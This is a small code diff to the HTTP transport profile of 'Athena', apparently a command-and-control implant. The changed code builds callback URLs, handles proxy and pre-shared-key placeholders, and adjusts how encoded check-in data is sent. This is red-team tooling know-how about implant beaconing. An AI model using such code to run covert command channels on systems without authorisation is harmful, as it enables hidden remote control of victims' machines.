@@ -49,7 +49,7 @@ namespace Athena.Profiles.HTTP
             this.hostHeader = "%HOSTHEADER%";
             this.getURL = $"{callbackHost.TrimEnd('/')}:{callbackPort}/{getUri}?{queryPath}=";
             this.postURL = $"{callbackHost.TrimEnd('/')}:{callbackPort}/{postUri}";
-            this.proxyHost = ":";
+            this.proxyHost = "proxy_host:proxy_port";
             this.proxyPass = "proxy_pass";
             this.proxyUser = "proxy_user";
             this.psk = "AESPSK";
@@ -101,6 +101,8 @@ namespace Athena.Profiles.HTTP
                 this.crypt = new PSKCrypto(this.uuid, this.psk);
                 this.encrypted = true;
             }
+
+            //%CUSTOMHEADERS%"
         }
         public async Task<CheckinResponse> Checkin(Checkin checkin)
         {
@@ -203,7 +205,7 @@ namespace Athena.Profiles.HTTP
                 if (json.Length < 2000) //Max URL length
                 {
                     Debug.WriteLine($"[{DateTime.Now}] Sending as GET");
-                    response = await this.client.GetAsync(this.getURL + json.Replace("=", "").Replace('+', '-').Replace('/', '_'));
+                    response = await this.client.GetAsync(this.getURL + json.Replace('+', '-').Replace('/', '_'));
                 }
                 else
                 {
